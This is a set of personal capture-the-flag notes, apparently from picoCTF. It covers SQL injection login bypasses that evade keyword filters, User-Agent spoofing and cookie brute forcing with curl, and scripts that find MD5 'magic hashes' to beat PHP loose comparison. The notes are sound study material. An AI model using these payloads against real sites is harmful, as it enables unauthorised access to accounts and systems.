Find all instances of a text line files in current and all subdirectories

grep -r "test"


## SQL injection (sqlite)

`SELECT * FROM user WHERE username='<u>' AND password='<p>'`

Task is to login as admin (known username as `admin`) with the following restriction:

1. `or`
u: admin' --
p: (doesn't matter because commented out with --)

2. `or` `and` `like` `=` `--`

u: admin'; #
p: (doesn't materr because commented out with #)

3. `or` `and` `=` `like` `>` `<` `--` (I suspect also `#`)

u: admin';
p: (doesn't matter because statment has been ended)

4 `or` `and` `=` `like` `>` `<` `--` `admin` + common filters (whitespace!)

my idea: concat!

u: ad'||'min';
p: (doesn't matter because statement has ended)

alternative:

u: ad/\*\*/min';  (`ad/**/min';`)

u: blah'/\*\*/union/\*\*/select/\*\*/*/\*\*/from/\*\*/users/\*\*/limit/\*\*/1;
(`blah'/*\*/union/**/select/**/*/**/from/**/users/**/limit/**/1;`)

5. `or` `and` `=` `like` `>` `<` `--` `admin` `union` + common filters (whitespace!)

All Filters:

```php
<?php
session_start();

if (!isset($_SESSION["round"])) {
    $_SESSION["round"] = 1;
}
$round = $_SESSION["round"];
$filter = array("");
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($round === 1) {
    $filter = array("or");
    if ($view) {
        echo "Round1: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round3: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round4: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round5: ".implode(" ", $filter)."<br/>";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}
?>
```

## User-Agent control ##

one challenge in picoCTF has you click a button `flag` (leading to the `/flag` page) but clicking it gives "you're not picobrowser! 


I've seen this before, the referrer is what they're asking about. Here's the raw curl request:

```bash
curl 'https://jupiter.challenges.picoctf.org/problem/28921/flag' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Mobile Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Referer: https://jupiter.challenges.picoctf.org/problem/28921/flag' \
  -H 'Accept-Language: en-US,en;q=0.9,fr;q=0.8,es;q=0.7' \
  -H 'Cookie: PHPSESSID=rinmbr5fv8gekg81vitj13cj5s' \
  --compressed
```
Deleting all the uneccesary garbage and changing the user-agent:

```bash
curl 'https://jupiter.challenges.picoctf.org/problem/28921/flag' \
  -H 'User-Agent: picobrowser' \
```

Full disclosure: I thought at first it was the referer, but that's involved with redirects. Random facts which may be useful. Whenever your security doesn't change or is upgraded (HTTP -> HTTP, HTTPS -> HTTPS, HTTP -> HTTPS) a referrer is tagged on. But whenever you downgrade (HTTPS -> HTTP) referrer coems back as empty. Another use for changing the user-agent is to have the interface change as if you were a mobile device (useful as a developer for sure)


Get header info with curl:

`curl -I http://mercury.picoctf.net:47967/`

brute force a cookie
```bash
for f in {1..100}
do
        echo $f
curl --silent 'http://mercury.picoctf.net:27177/check' \
  -H "Cookie: name=$f" | grep "pico"
done
```

Apache Server 

The congiguration file is `.htaccess`, searching for it in the url may be helpful. If the host machine is a Mac, a `.DS_Store` may also be available. This file typically stores custom attributes (background image, icon position, etc.) This is similart o Windows' `desktop.ini`.

AES-CBC

AES-CBC (cipher block chain) is vulnerable to bit flipping attacks. Given a page which is encrypted (with an unknown key)

md5 collision

Related to th birthday paradox, I came across a challenge where you must upload two pdf files which have the same md5 hash, but they differ. Presumably php hashes both files and checks their equality. I rememeber hearing that md5 is broken, so I assumed that meant it was easy/quick to break, so I set off at first by creating a file then continuing to make new files and seeing if they have the same hash as the first. 

```python
#make_pdf.py
from fpdf import FPDF
import sys


infile = sys.argv[1]
outfile = sys.argv[2]

pdf = FPDF()
pdf.add_page()
pdf.set_font("Arial", size=15)
with open(infile,'r') as f:
    for x in f:
        pdf.cell(200, 10, txt=x, ln=1, align='C')

pdf.output(outfile)
```
```bash
f1=$(md5sum file1.pdf | cut -f1 -d' ')
f2=$(md5sum file2.pdf | cut -f1 -d' ')
while [ $f1 != $f2 ]
do
        #/usr/bin/python3 make_pdf.py file1.txt file1.pdf & chmod a+r file1.pdf
        /usr/bin/python3 make_pdf.py file2.txt file2.pdf & chmod a+r file2.pdf
        f1=$(md5sum file1.pdf | cut -f1 -d' ')
        f2=$(md5sum file2.pdf | cut -f1 -d' ')
        echo "$f1 $f2"
        sleep 0.9
        if [ "$f1" == "$f2" ]
                then echo "they're equal"
        fi
done
```
Why is there a sleep for almost a second? Because I've observed that the time of creation of the pdf file contributes to the hash. In my initial tests, without sleeping, I was seeing multiple rows that were the same.

Needless to say, this didn't progress quickly. I realized this isn't taking advantage of the birthday paradox. The reason it's a paradox is because we initially think "it's unlikely there will be someone else with my same birthday". -- but that's not what the paradox is about. It's about the likelihood of ANY 2 people having the same birthday. So it's like sampling without replacement. So I wrote a python script that would generate the files, hash it, then store the hash as a dictionary key (value being th file name). In this iteration I also "cut out the middleman" by not creating text files, and those textfiles into a pdf. 

```python
#makepdfs.py
def make_pdf(i,outfile):
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=15)
    pdf.cell(200, 10, txt=str(i), ln=1, align='C')
    pdf.output(outfile)

checksums = {}
i = 0
while i<100:
    outfile = f'pdfs/{i}.pdf'
    make_pdf(i,outfile)
    with open(outfile, 'rb') as f:
        data = f.read()
        checksum = md5(data).hexdigest()
        if checksum in checksums:
            print(f'collision found! "{checksum}" for {i} and {checksums[checksum]}')
```
This went much more quickly, generation millions of files in a few minutes.... but of course that took up a lot of space and started to slow things down.

I then started looking for hints and I saw "how would php compare two files?" (the answer being potentially with `==` which checks equality AFTER typechecking. For example, with type checking, `1 == TRUE` is true. To avoid type checking and actually check equality, you must us `===`. Here, `1 === 1` is true, but `1 === TRUE` is false. Further investigation online led me to the concept of magic hashes. i.e. hashes of the form `0e(+only digits)`. This, after type checking resolves to zero raised to the power of a number, which is zero. So I then created this python script to try and create such files

```python
from fpdf import FPDF
from hashlib import md5
import re
import os

def make_pdf(i,outfile):
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=15)
    pdf.cell(200, 10, txt=str(i), ln=1, align='C')
    pdf.output(outfile)

collisions = []
integers = []
i = 0
while len(collisions) < 2:
    outfile = f'pdfs/{i}.pdf'
    make_pdf(i,outfile)
    with open(outfile, 'rb') as f:
        data = f.read()
        checksum = md5(data).hexdigest()
        if re.match(r'0e\d+\b',checksum):
            collisions.append(checksum)
            integers.append(i)
            print(f'zero found! "{checksum}" for {i}')
        else:
            os.remove(outfile)

    i +=1
```
It ran for 7 hours without finding anything. Then I calculated the odds of finding ONE hash in th form I want is about 3 in a billion. I had in those 8 hours created and checked 100 million files. I was one thousandth of the way there and estimated 2.3 years before I would find on number.

I already found a list of magic hashes, for example: `240610708:0e462097431906509019562988736854`, when I tested them out, I found that `echo "240610708" | md5sum` DID NOT give the magic hash, or anything remotely similar. But then I found that `echo -n "240610708" | md5sum` did. It's all about removing that newline character. I also found out with just a text file, it's the contents and nothing else that is hashed (probably it's bytes) so I could also do `echo "240610708" | md5sum > file.txt`, then boom, I have such a file which hashes. I figured the fil creation step was slowing me down quite a bit, so I could just search for the hashes first and THEN create the files. From the list I found, I know that there are many hashes of capital letters of 8 digits which give magic hashes. 8 digits is not that much so I can brute force it. Rather than grabbing the posted items, I really want to generate them. So this gives me two such hashes in less than 30 mins:

```python
from hashlib import md5
import itertools
import re
import sys
import os

letters = list('ABCDEFGHIJKLMNOPQRSTUVWXYZ')

collisions = []
guesses = []
for i in range(8):
    for guess in itertools.product(letters, repeat=i):
        guess = ''.join(guess)
        checksum = md5(guess.encode()).hexdigest()
        if re.match(r'0e\d+\b',checksum):
            collisions.append(checksum)
            guesses.append(guess)
            print(guess, checksum)
            if len(collisions) >= 2:
                sys.exit(0)

# output:
# ABJIHVY 0e755264355178451322893275696586
# DQWRASX 0e742373665639232907775599582643
```
From the list I saw there was an entry like:
`BRTKUJZ:00e57640477961333848717747276704` which means I could have expanded my regex to include any number of leading 0's followed by an e followed by a number. Regardless, this was the ultimate php managing script. Fortunately just renaming a text file .php is sufficient to trick that.

```php
<?php

if (isset($_POST["submit"])) {
    $type1 = $_FILES["file1"]["type"];
    $type2 = $_FILES["file2"]["type"];
    $size1 = $_FILES["file1"]["size"];
    $size2 = $_FILES["file2"]["size"];
    $SIZE_LIMIT = 18 * 1024;

    if (($size1 < $SIZE_LIMIT) && ($size2 < $SIZE_LIMIT)) {
        if (($type1 == "application/pdf") && ($type2 == "application/pdf")) {
            $contents1 = file_get_contents($_FILES["file1"]["tmp_name"]);
            $contents2 = file_get_contents($_FILES["file2"]["tmp_name"]);

            if ($contents1 != $contents2) {
                if (md5_file($_FILES["file1"]["tmp_name"]) == md5_file($_FILES["file2"]["tmp_name"])) {
                    highlight_file("index.php");
                    die();
                } else {
                    echo "MD5 hashes do not match!";
                    die();
                }
            } else {
                echo "Files are not different!";
                die();
            }
        } else {
            echo "Not a PDF!";
            die();
        }
    } else {
        echo "File too large!";
        die();
    }
}
?>
```
